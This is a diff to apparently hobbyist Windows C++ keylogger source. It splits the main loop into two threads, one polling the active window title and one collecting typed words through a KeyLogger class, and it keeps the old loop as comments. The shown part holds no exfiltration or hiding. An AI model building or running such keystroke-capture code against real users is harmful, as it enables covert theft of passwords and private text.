@@ -13,6 +13,7 @@
 #include <codecvt>
 #include <psapi.h>
 #include <shlwapi.h>
+#include <thread>
 #include <libloaderapi.h>
 #include "ProcessMonitor.h"
 #include "Looper.h"
@@ -129,23 +130,41 @@ class KeyLogger {
 /// <returns></returns>
 int main()
 {
+    //
     bool monitor = true;
     bool delay = 50; // 50 ms
     std::vector<std::string> words;
     std::string word = "";
     std::string activeWindow = "";
-    // infinite loop each 50 ms
-    Looper::DoWhile(delay, monitor, [&word, &activeWindow]() {
-        // word assignation
-        // word = KeyLogger::OnNewWord(word, [](char c) {}, [](std::string w) {
-        //    // new word appear!!
-        //    std::cout << w << std::endl;
-        // });
-        // active window assignation
+    // infinite loop each 200 ms
+    std::thread windowThread = Looper::Thread(200, true, [&activeWindow]() {
+        // 
         activeWindow = ProcessMonitor::OnWindowChange(activeWindow, [](std::string w) {
             // active window has been changed!!
             std::cout << w << std::endl;
         });
     });
+    // 
+    std::thread keyloggerThread = Looper::Thread(50, true, [&word]() {
+        //
+        word = KeyLogger::OnNewWord(word, [](char c) {}, [](std::string w) {
+            // new word appear!!
+            // std::cout << w << std::endl;
+        });
+    });
+    windowThread.join();
+    keyloggerThread.join();
+    //Looper::DoWhile(delay, monitor, [&word, &activeWindow]() {
+    //    // word assignation
+    //     word = KeyLogger::OnNewWord(word, [](char c) {}, [](std::string w) {
+    //        // new word appear!!
+    //        std::cout << w << std::endl;
+    //     });
+    //    // active window assignation
+    //    activeWindow = ProcessMonitor::OnWindowChange(activeWindow, [](std::string w) {
+    //        // active window has been changed!!
+    //        std::cout << w << std::endl;
+    //    });
+    //});
     return 0;
 }
